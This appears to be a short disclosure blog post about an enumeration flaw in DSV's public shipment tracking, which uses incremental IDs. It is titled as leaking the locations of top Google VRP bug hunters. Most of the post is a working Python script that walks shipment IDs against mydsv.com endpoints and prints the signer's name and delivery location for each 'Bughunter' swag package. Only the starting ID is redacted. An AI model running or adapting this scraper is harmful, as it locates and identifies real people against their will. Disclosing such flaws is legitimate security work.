title: Leaking the locations of the top Google VRP Bug hunters (WAI)
---

When Google gave bug hunters swag they used a logistics company called DSV.
Unfortunately they allow for tracking shipments using an incremental number.

```python
import httpx

requests = 2000
start = <redacted>

def parseSearch(search, id):
    for item in search['data']:
        if item['mainTmsShipmentId'] == str(id):
            return item['randomIdentifier']

def printID(id):
    ShipmentId = str(id)
    Results = httpx.get('https://mydsv.com/app/search/publicShipmentList?q=' + ShipmentId).json()
    RandomId = parseSearch(Results, ShipmentId)
    if not RandomId:
        return
    Shipment = httpx.get('https://mydsv.com/app/search/shipment/' + RandomId).json()
    if 'Bughunter' in str(Shipment['description']):
        print(str(Shipment['signedBy']) + ',' + str(Shipment['delivery']['formattedLocation']).replace(',','') + ' ' + str(Shipment['delivery']['countryCode']))


for i in range(requests):
    printID(start+i)
    if i == 0:
        continue
    printID(start-i)
```
The following code gets their location and who signed for it (if any) by searching the range.

If you're affected by this you can contact the company for data deletion, I don't feel ignoring it is helping to protect people's privacy now or in future use.
I am however keeping the start value secret for privacy through obscurity, in case the attacker doesn't know how to count.
